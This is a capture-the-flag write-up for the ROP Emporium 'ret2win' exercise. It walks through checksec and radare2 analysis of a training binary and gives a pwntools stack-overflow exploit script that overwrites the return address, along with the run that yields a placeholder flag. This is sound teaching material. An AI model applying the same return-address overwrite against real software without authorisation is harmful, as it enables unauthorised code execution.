1. `file ret2win`, gdb-peda `checksec` take a look.

```bash
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```

```bash
$ gdb-peda ret2win
Reading symbols from ret2win...
(No debugging symbols found in ret2win)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

2. `r2 ret2win`, `aa`, `afl`. There're some special function, we'll check them later.

```bash
$ r2 ret2win
[0x004005b0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x004005b0]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   sym.__do_global_dtors_aux
0x00400690    1 7            entry.init0
0x004006e8    1 110          sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400756    1 27           sym.ret2win
0x00400560    1 6            sym.imp.system
0x004007f0    1 2            sym.__libc_csu_fini
0x004007f4    1 9            sym._fini
0x00400780    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
[0x004005b0]>
```
3. `s main`, `VV` to see what main function do. it seems nothing special in main function but call the function pwnme and print some strings. So we go to see what happends in the function pwnme.
![Image](https://i.imgur.com/jiYjxOg.png)

4. `s sym.pwnme`, `VV`. In this function, we found the input will be put at **var_20h(rbp-0x20)**. 

![Image](https://i.imgur.com/p38FkK4.png)

![Image](https://i.imgur.com/9WEcrRi.png)

5. let's look at another function ret2win. `s sym.ret2win`, `VV`. we saw it will print the flag we want, so we know that our mission is to BOF the pwnme function's stack and put the address of ret2win function to the return address of pwnme's stack frame.

![Image](https://i.imgur.com/R3cHeB1.png)

6. write the exploit script bellow.

```python
from pwn import *

r = process('./ret2win')
#r = remote('120.114.62.211', 6126)

payload = b'A'*40

r.sendline(payload + p64(0x00400756))  #if 64 bit ,or 32bit use p32

r.interactive()
```
7. run the script and we can get the flag.

```zsh
$ python3 exploit_ret2win.py
[+] Starting local process './ret2win': pid 715
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```

the flag is：ROPE{a_placeholder_32byte_flag!}